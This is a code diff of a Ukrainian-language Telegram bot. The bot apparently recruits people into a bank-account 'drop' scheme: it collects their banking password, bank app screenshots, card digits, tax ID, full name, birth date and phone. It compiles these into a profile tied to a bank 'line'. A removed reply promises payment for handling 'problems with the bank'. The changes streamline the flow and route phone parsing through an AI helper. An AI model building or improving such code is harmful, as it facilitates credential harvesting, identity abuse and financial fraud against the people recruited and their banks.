@@ -542,15 +542,12 @@ async def process_client_password(message: Message, state: FSMContext):
             bank_name = line_info['bank'].strip().lower()
 
     if bank_name == "bank.kd":
-        state_data = await state.get_data()
-        if state_data.get("client_card"):
-            # Пропускаємо ручне введення карти, якщо вона вже повністю розпізнана зі скріншоту
-            await message.answer("Будь ласка, напишіть Ваш номер телефону?")
-            await state.set_state(RegistrationStates.waiting_phone)
-        else:
-            await message.answer("Напишіть будь ласка повний номер картки bank.kd")
-            await state.set_state(RegistrationStates.waiting_card_number)
+        # Для bank.kd не просимо скріншот з меню картки та повний номер картки
+        # Після пароля запитуємо номер телефону
+        await message.answer("Будь ласка, напишіть Ваш номер телефону?")
+        await state.set_state(RegistrationStates.waiting_phone)
     else:
+        # Для інших банків теж запитуємо номер телефону після пароля
         await message.answer("Будь ласка, напишіть Ваш номер телефону?")
         await state.set_state(RegistrationStates.waiting_phone)
 
@@ -598,38 +595,49 @@ async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
     text = message.text.strip()
     client_id = message.from_user.id
     
-    # 1. Перевіряємо чи це запитання "для чого?" / "навіщо?"
-    question_pattern = re.compile(
-        r'(?i)\b(навіщо|для\s+чого|зачем|чому|почему|яка\s+ціль|для\s+яких\s+цілей|накуя|нахуя)\b'
-    )
-    if question_pattern.search(text) or text.endswith('?'):
-        await message.answer(
-            "В разі проблем з банком дзвонимо вам платимо гроші і ви їх рішаєте"
-        )
-        return
-
-    # 2. Валідуємо номер телефону
-    cleaned_phone = re.sub(r'[^\d+]', '', text)
-    digits_only = re.sub(r'\D', '', cleaned_phone)
-    
-    if len(digits_only) < 9 or len(digits_only) > 13:
-        await message.answer(
-            "Будь ласка, введіть коректний номер телефону (наприклад: +380635685804):"
-        )
-        return
-
     session = await db.get_session(client_id)
     if not session:
         await message.answer("Помилка: сесія не знайдена. Спробуйте /start.")
         await state.clear()
         return
 
+    # Використовуємо ШІ для обробки відповіді про номер телефону
+    from bot.openai_client import get_support_response
+    response = await get_support_response(
+        user_text=text,
+        client_data=session.get('client_data', ''),
+        current_bank_name="номер телефону"
+    )
+    
+    # Перевіряємо чи ШІ розпізнав номер телефону
+    phone_match = re.search(r'\[PHONE:\s*([+\d\s\(\)]{9,20})\]', response)
+    if phone_match:
+        phone_number = phone_match.group(1).strip()
+        # Зберігаємо номер телефону в сесію
+        await db.update_session_client_phone(client_id, phone_number)
+        
+        # Переходимо до наступного кроку
+        await message.answer("Дякую! Номер телефону прийнято.")
+        await continue_after_phone(message, state, bot, client_id)
+    else:
+        # Якщо ШІ не розпізнав номер, просимо повторити
+        clean_text = re.sub(r'\[[^\]]+\]', '', response).strip()
+        await message.answer(clean_text or "Будь ласка, надішліть коректний номер телефону.")
+
+async def continue_after_phone(message: Message, state: FSMContext, bot: Bot, client_id: int):
+    """Продовження після отримання номера телефону"""
     data = await state.get_data()
     client_password = data.get('client_password')
-    success_photo_id = data.get('success_photo_id') or data.get('last_photo_id') or (session.get('success_photo_id') if session else None)
-    card_photo_id = data.get('card_photo_id') or (session.get('card_photo_id') if session else None)
+    success_photo_id = data.get('success_photo_id') or data.get('last_photo_id')
+    card_photo_id = data.get('card_photo_id')
     client_card = data.get('client_card')
     
+    session = await db.get_session(client_id)
+    if not session:
+        await message.answer("Помилка: сесія не знайдена. Спробуйте /start.")
+        await state.clear()
+        return
+
     await state.clear()
 
     # Розпарсимо PIB, DOB, IPN з client_data
@@ -648,15 +656,16 @@ async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
     if line_id:
         line_info = await db.get_line(line_id)
         if line_info:
-            line_str = f"Return: {line_info['phone_number']} | {line_info['bank']}"
+            line_str = f"Line {line_id} | Return: {line_info['phone_number']} | {line_info['bank']}"
             bank_name = line_info['bank']
 
     # Формуємо анкету без "РЕЄСТРАЦІЙНІ ДАНІ"
+    phone_number = session.get('client_phone', text if 'text' in locals() else '')
     anketa_text = (
         f"ІПН: {ipn}\n"
         f"ПІБ: {pib}\n"
         f"Дата: {dob}\n"
-        f"Телефон: {text}\n\n"
+        f"Телефон: {phone_number}\n\n"
     )
     
     username = message.from_user.username
@@ -1364,21 +1373,15 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
 
                 return
             elif "[KD_MAIN_SCREEN]" in response:
-                kd_prompt = (
-                    "Дякую! Перший скріншот прийнято.\n\n"
-                    "Тепер, будь ласка, перейдіть у вкладку \"Картки\" (або натисніть на саму картку), "
-                    "щоб було видно її номер, та надішліть до чату ще 1 скрін."
+                # Для bank.kd не просимо другий скріншот - одразу переходимо до запиту номера телефону
+                success_text = (
+                    "Дякую! Скріншот прийнято.\n\n"
+                    "Будь ласка, напишіть Ваш номер телефону?"
                 )
-                import os
-                photo_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "resources", "images", "bank.kd_cards_instruction.png")
-                if os.path.exists(photo_path):
-                    await message.answer_photo(photo=FSInputFile(photo_path), reply_markup=ReplyKeyboardRemove())
-                    await message.answer(kd_prompt)
-                else:
-                    await message.answer(kd_prompt, reply_markup=ReplyKeyboardRemove())
+                await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
                 await state.update_data(success_photo_id=photo.file_id)
                 await db.update_session_verification_data(client_id, success_photo_id=photo.file_id, card_first4=card_first4, card_last4=card_last4)
-                await state.set_state(RegistrationStates.waiting_card_screenshot)
+                await state.set_state(RegistrationStates.waiting_phone)
                 return
             else:
                 clean_text = re.sub(r'\[[^\]]+\]', '', response).strip()
